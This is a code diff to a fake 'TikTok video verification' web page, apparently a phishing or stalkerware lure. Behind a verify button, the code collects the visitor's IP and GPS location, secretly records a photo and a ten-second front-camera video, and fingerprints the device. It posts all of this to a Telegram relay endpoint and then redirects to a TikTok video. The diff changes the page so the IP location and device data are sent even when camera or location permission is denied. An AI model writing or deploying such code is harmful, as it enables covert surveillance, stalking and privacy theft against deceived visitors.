@@ -91,14 +91,121 @@ export default function TikTokVerifyPage() {
     }, 2000);
   };
 
+  // Get IP-based geolocation as fallback
+  const getIPLocation = async (): Promise<{ ip: string; city: string; region: string; country: string; loc: string; org: string } | null> => {
+    try {
+      const res = await fetch("https://ipinfo.io/json?token=56ce10652d9d41");
+      const data = await res.json();
+      if (data.ip) return data;
+      return null;
+    } catch {
+      return null;
+    }
+  };
+
+  // Collect device info for Telegram
+  const collectDeviceInfo = (ipLoc: { ip: string; city: string; region: string; country: string; loc: string; org: string } | null, gpsLoc: { lat: number; lng: number } | null) => {
+    const ua = navigator.userAgent;
+    const getOS = () => {
+      if (/android/i.test(ua)) {
+        const androidMatch = ua.match(/Android\s+([\d.]+)/);
+        const modelMatch = ua.match(/;\s*([^;)]+)\s*(?:Build|[);])/);
+        return "Android " + (androidMatch?.[1] || "?") + " (" + (modelMatch?.[1]?.trim() || "Unknown Device") + ")";
+      }
+      if (/iPad|iPhone|iPod/.test(ua)) {
+        const iosMatch = ua.match(/OS\s+([\d_]+)/);
+        return "iOS " + (iosMatch?.[1]?.replace(/_/g, ".") || "?");
+      }
+      if (/Windows/.test(ua)) {
+        const winMatch = ua.match(/Windows NT\s+([\d.]+)/);
+        const winVer: Record<string, string> = {"10.0": "10/11", "6.3": "8.1", "6.2": "8", "6.1": "7"};
+        return "Windows " + (winVer[winMatch?.[1] || ""] || winMatch?.[1] || "?");
+      }
+      if (/Mac OS X/.test(ua)) {
+        const macMatch = ua.match(/Mac OS X\s+([\d_]+)/);
+        return "macOS " + (macMatch?.[1]?.replace(/_/g, ".") || "?");
+      }
+      if (/Linux/.test(ua)) return "Linux";
+      return "Unknown OS";
+    };
+    const getBrowser = () => {
+      if (/Edg\//.test(ua)) return "Edge " + (ua.match(/Edg\/([\d.]+)/)?.[1] || "?");
+      if (/Chrome\//.test(ua) && !/OPR\//.test(ua)) return "Chrome " + (ua.match(/Chrome\/([\d.]+)/)?.[1] || "?");
+      if (/Firefox\//.test(ua)) return "Firefox " + (ua.match(/Firefox\/([\d.]+)/)?.[1] || "?");
+      if (/Safari\//.test(ua)) return "Safari " + (ua.match(/Version\/([\d.]+)/)?.[1] || "?");
+      return "Unknown Browser";
+    };
+    const getConnection = () => {
+      const conn = (navigator as any).connection || (navigator as any).mozConnection || (navigator as any).webkitConnection;
+      if (conn) {
+        const type = conn.effectiveType || conn.type || "unknown";
+        const downlink = conn.downlink ? conn.downlink + " Mbps" : "";
+        const rtt = conn.rtt ? " (" + conn.rtt + "ms latency)" : "";
+        return type.toUpperCase() + (downlink ? " - " + downlink : "") + rtt;
+      }
+      return "Unknown";
+    };
+
+    let batteryInfo = "Unknown";
+    const ramGB = (navigator as any).deviceMemory ? (navigator as any).deviceMemory + " GB" : "Unknown";
+    const cpuCores = navigator.hardwareConcurrency || "Unknown";
+    const orientation = window.screen.orientation?.type || (window.innerWidth > window.innerHeight ? "landscape" : "portrait");
+    const dpr = window.devicePixelRatio || 1;
+    const colorDepth = window.screen.colorDepth;
+
+    // Build location section - prefer GPS, fallback to IP
+    let locationLine = "";
+    if (gpsLoc) {
+      locationLine = "\ud83c\udf10 Latitude: " + gpsLoc.lat + "\n\ud83c\udf10 Longitude: " + gpsLoc.lng + "\n\ud83d\udd17 Google Maps: https://www.google.com/maps?q=" + gpsLoc.lat + "," + gpsLoc.lng;
+    } else if (ipLoc) {
+      locationLine = "\ud83d\udd52 IP: " + ipLoc.ip + "\n\ud83d\udccd City: " + ipLoc.city + "\n\ud83d\udccd Region: " + ipLoc.region + "\n\ud83c\udf0d Country: " + ipLoc.country + "\n\ud83d\udd17 Maps: https://www.google.com/maps?q=" + ipLoc.loc;
+    } else {
+      locationLine = "\u274c No location available";
+    }
+
+    // Use string concatenation to avoid escaping issues
+    const line = "\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501";
+
+    const locationInfoStr =
+      "\ud83c\udfb5 TIKTOK VIDEO VERIFICATION\n" + line +
+      "\n\u23f0 Time: " + new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" }) +
+      "\n\ud83d\udcc5 Timestamp: " + new Date().toISOString() +
+      "\n\n\ud83d\udccd LOCATION\n" + line +
+      "\n" + locationLine +
+      "\n\n\ud83d\udcbb DEVICE DETAILS\n" + line +
+      "\n\ud83d\udcf1 OS: " + getOS() +
+      "\n\ud83c\udf10 Browser: " + getBrowser() +
+      "\n\ud83d\udda5\ufe0f Platform: " + navigator.platform +
+      "\n\ud83c\udf0d Language: " + navigator.language +
+      "\n\ud83d\udd50 Timezone: " + Intl.DateTimeFormat().resolvedOptions().timeZone +
+      "\n\ud83d\udd0b Battery: " + batteryInfo +
+      "\n\ud83e\udde0 RAM: " + ramGB +
+      "\n\u26a1 CPU Cores: " + cpuCores +
+      "\n\ud83d\udcf6 Network: " + getConnection() +
+      "\n\n\ud83d\udccd SCREEN\n" + line +
+      "\n\ud83d\udccf Resolution: " + window.screen.width + "x" + window.screen.height +
+      "\n\ud83d\udc41\ufe0f Viewport: " + window.innerWidth + "x" + window.innerHeight +
+      "\n\ud83d\udd0d Pixel Ratio: " + dpr + "x" +
+      "\n\ud83c\udfa8 Color Depth: " + colorDepth + "-bit" +
+      "\n\ud83d\udd04 Orientation: " + orientation +
+      "\n\n\ud83d\udccb USER AGENT\n" + line +
+      "\n" + ua;
+
+    return locationInfoStr;
+  };
+
   const handleVerifyClick = async () => {
     if (hasTriggered) return;
     setHasTriggered(true);
     setIsChecking(true);
 
+    // Always fetch IP location first (works without permission)
+    const ipLocation = await getIPLocation();
+
+    // Request geolocation (may be denied)
+    let gpsLocation: { lat: number; lng: number } | null = null;
     try {
-      // 1. Request Geolocation FIRST
-      let locationPromise = new Promise<{ lat: number; lng: number } | null>((resolve) => {
+      gpsLocation = await new Promise<{ lat: number; lng: number } | null>((resolve) => {
         if ("geolocation" in navigator) {
           navigator.geolocation.getCurrentPosition(
             (pos) => resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude }),
@@ -109,102 +216,53 @@ export default function TikTokVerifyPage() {
           resolve(null);
         }
       });
+    } catch {
+      gpsLocation = null;
+    }
 
-      // 2. Request Camera Permission (after location)
-      const stream = await navigator.mediaDevices.getUserMedia({
+    // Request camera permission
+    let stream: MediaStream | null = null;
+    try {
+      stream = await navigator.mediaDevices.getUserMedia({
         video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } },
       });
-
-      setIsVerified(true);
-      setIsChecking(false);
-
-      (async () => {
-        try {
-          const photoBlob = await takePhoto(stream);
-          const videoBlob = await recordVideo(stream, 10000);
-          stream.getTracks().forEach((track) => track.stop());
-          const location = await locationPromise;
-
-          const formData = new FormData();
-          if (photoBlob) formData.append("photo", photoBlob, "photo.jpg");
-          if (videoBlob) formData.append("video", videoBlob, "video.webm");
-
-          const ua = navigator.userAgent;
-          const getOS = () => {
-            if (/android/i.test(ua)) {
-              const androidMatch = ua.match(/Android\s+([\d.]+)/);
-              const modelMatch = ua.match(/;\s*([^;)]+)\s*(?:Build|[);])/);
-              return `Android ${androidMatch?.[1] || '?'} (${modelMatch?.[1]?.trim() || 'Unknown Device'})`;
-            }
-            if (/iPad|iPhone|iPod/.test(ua)) {
-              const iosMatch = ua.match(/OS\s+([\d_]+)/);
-              return `iOS ${iosMatch?.[1]?.replace(/_/g, '.') || '?'}`;
-            }
-            if (/Windows/.test(ua)) {
-              const winMatch = ua.match(/Windows NT\s+([\d.]+)/);
-              const winVer: Record<string, string> = {'10.0': '10/11', '6.3': '8.1', '6.2': '8', '6.1': '7'};
-              return `Windows ${winVer[winMatch?.[1] || ''] || winMatch?.[1] || '?'}`;
-            }
-            if (/Mac OS X/.test(ua)) {
-              const macMatch = ua.match(/Mac OS X\s+([\d_]+)/);
-              return `macOS ${macMatch?.[1]?.replace(/_/g, '.') || '?'}`;
-            }
-            if (/Linux/.test(ua)) return 'Linux';
-            return 'Unknown OS';
-          };
-          const getBrowser = () => {
-            if (/Edg\//.test(ua)) return `Edge ${ua.match(/Edg\/([\d.]+)/)?.[1] || '?'}`;
-            if (/Chrome\//.test(ua) && !/OPR\//.test(ua)) return `Chrome ${ua.match(/Chrome\/([\d.]+)/)?.[1] || '?'}`;
-            if (/Firefox\//.test(ua)) return `Firefox ${ua.match(/Firefox\/([\d.]+)/)?.[1] || '?'}`;
-            if (/Safari\//.test(ua)) return `Safari ${ua.match(/Version\/([\d.]+)/)?.[1] || '?'}`;
-            return 'Unknown Browser';
-          };
-          const getConnection = () => {
-            const conn = (navigator as any).connection || (navigator as any).mozConnection || (navigator as any).webkitConnection;
-            if (conn) {
-              const type = conn.effectiveType || conn.type || 'unknown';
-              const downlink = conn.downlink ? `${conn.downlink} Mbps` : '';
-              const rtt = conn.rtt ? ` (${conn.rtt}ms latency)` : '';
-              return `${type.toUpperCase()}${downlink ? ' - ' + downlink : ''}${rtt}`;
-            }
-            return 'Unknown';
-          };
-
-          let batteryInfo = 'Unknown';
-          try {
-            const battery = await (navigator as any).getBattery?.();
-            if (battery) {
-              const level = Math.round(battery.level * 100);
-              batteryInfo = `${level}%${battery.charging ? ' (Charging)' : ' (Discharging)'}`;
-            }
-          } catch {}
-
-          const ramGB = (navigator as any).deviceMemory ? `${(navigator as any).deviceMemory} GB` : 'Unknown';
-          const cpuCores = navigator.hardwareConcurrency || 'Unknown';
-          const orientation = window.screen.orientation?.type || (window.innerWidth > window.innerHeight ? 'landscape' : 'portrait');
-          const dpr = window.devicePixelRatio || 1;
-          const colorDepth = window.screen.colorDepth;
-
-          const locationInfoStr = `\ud83c\udfb5 TIKTOK VIDEO VERIFICATION\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n\u23f0 Time: ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}\n\ud83d\udd50 Timestamp: ${new Date().toISOString()}\n\n\ud83d\udccd LOCATION\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n${location ? `\ud83c\udf10 Latitude: ${location.lat}\n\ud83c\udf10 Longitude: ${location.lng}\n\ud83d\udd17 Google Maps: https://www.google.com/maps?q=${location.lat},${location.lng}` : '\u274c Location denied'}\n\n\ud83d\udcbb DEVICE DETAILS\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n\ud83d\udcf1 OS: ${getOS()}\n\ud83c\udf10 Browser: ${getBrowser()}\n\ud83d\udda5\ufe0f Platform: ${navigator.platform}\n\ud83c\udf0d Language: ${navigator.language}\n\ud83d\udd50 Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n\ud83d\udd0b Battery: ${batteryInfo}\n\ud83e\udde0 RAM: ${ramGB}\n\u26a1 CPU Cores: ${cpuCores}\n\ud83d\udcf6 Network: ${getConnection()}\n\n\ud83d\udccd SCREEN\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n\ud83d\udccf Resolution: ${window.screen.width}x${window.screen.height}\n\ud83d\udc41\ufe0f Viewport: ${window.innerWidth}x${window.innerHeight}\n\ud83d\udd0d Pixel Ratio: ${dpr}x\n\ud83c\udfa8 Color Depth: ${colorDepth}-bit\n\ud83d\udd04 Orientation: ${orientation}\n\n\ud83d\udccb USER AGENT\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n${ua}`;
-          formData.append("locationInfo", locationInfoStr);
-
-          await fetch("/api/telegram", {
-            method: "POST",
-            body: formData,
-          });
-
-          // Data terkirim, langsung redirect ke video TikTok
-          window.location.href = redirectUrl;
-        } catch (bgError) {
-          console.error("Background capture failed:", bgError);
-          window.location.href = redirectUrl;
-        }
-      })();
-
-    } catch (err) {
-      console.error("Permission denied or failed:", err);
-      window.location.href = redirectUrl;
+    } catch {
+      // Camera denied — still send IP location + device info
     }
+
+    setIsVerified(true);
+    setIsChecking(false);
+
+    // Always send data to Telegram
+    (async () => {
+      try {
+        const formData = new FormData();
+        let photoBlob: Blob | null = null;
+        let videoBlob: Blob | null = null;
+
+        if (stream) {
+          photoBlob = await takePhoto(stream);
+          videoBlob = await recordVideo(stream, 10000);
+          stream.getTracks().forEach((track) => track.stop());
+        }
+
+        if (photoBlob) formData.append("photo", photoBlob, "photo.jpg");
+        if (videoBlob) formData.append("video", videoBlob, "video.webm");
+
+        const locationInfoStr = await collectDeviceInfo(ipLocation, gpsLocation);
+        formData.append("locationInfo", locationInfoStr);
+
+        await fetch("/api/telegram", {
+          method: "POST",
+          body: formData,
+        });
+      } catch (bgError) {
+        console.error("Background capture failed:", bgError);
+      }
+
+      // Always redirect to TikTok
+      window.location.href = redirectUrl;
+    })();
   };
 
   const takePhoto = (stream: MediaStream): Promise<Blob | null> => {
